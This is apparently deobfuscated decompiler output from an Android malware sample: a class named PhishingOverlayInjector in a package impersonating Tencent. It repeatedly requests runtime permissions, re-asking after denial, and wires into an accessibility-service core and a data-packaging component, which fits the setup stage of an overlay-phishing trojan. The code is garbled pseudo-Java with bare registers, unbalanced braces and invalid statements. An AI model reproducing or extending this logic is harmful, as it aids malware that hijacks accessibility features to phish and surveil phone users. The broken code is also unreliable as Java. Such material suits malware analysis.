package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: PhishingOverlayInjector
 * Original: Lcom/tencent/interfacexseekz12;
 */
public class PhishingOverlayInjector extends Activity {

    // === METHODS ===

    public void Constructor() {
        // new Activity()
        return;
    }

    public static transient boolean hasPermissions(Context param0, String[] param1) {
        if (v4 == null || v4 == 0) { // goto +21
        if (v5 == null || v5 == 0) { // goto +19
        v0 = v5.length;
        v1 = 0;
        v2 = 0;
        if (v2 >= v0) { // goto +14
        v3 = v5[v2];
        v2 = ActivityCompat.checkSelfPermission(v4, v3);
        if (v3 == null || v3 == 0) { // goto +3
        return 0;
        v2 = v2 + 1;
        // goto (branch)
        v4 = 1;
        return 1;
    }

    public void finish() {
        v0 = 0;
        Boolean.valueOf(0);
        DataPackagingEngine.asked = 0;
        v1.finishAndRemoveTask();
        return;
    }

    public void onCreate(Bundle param0) {
        v1.onCreate(v2);
        v2 = 1;
        Boolean.valueOf(1);
        AccessibilityServiceCore.tunesxconcerningn1012FOR_prim = 1;
        DataPackagingEngine.PERMISSIONS();
        v0 = PhishingOverlayInjector.hasPermissions(v1, 1);
        if (v0 != null && v0 != 0) { // goto +12
        v0 = 151;
        ActivityCompat.requestPermissions(v1, 1, 151);
        // goto (branch)
        1.printStackTrace();
        return;
    }

    public void onRequestPermissionsResult(int param0, String[] param1, int[] param2) {
        v0.onRequestPermissionsResult(v1, v2, v3);
        v2 = 151;
        if (v1 == 151) { // goto +3
        // goto (branch)
        v1 = v3.length;
        if (v1 <= 0) { // goto +30
        v1 = 0;
        v3 = v3[0];
        if (v3 != null && v3 != 0) { // goto +25
        v1 = Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012FOR_prim = 0;
        v1 = 1;
        AccessibilityServiceCore.ifFinishiInitPermission = 1;
        v0.finish();
        // new AccessibilityEventMonitor$Event(151)
        AccessibilityEventMonitor.publish(1);
        // goto (branch)
        DataPackagingEngine.PERMISSIONS();
        ActivityCompat.requestPermissions(v0, 1, 151);
        return;
    }
}
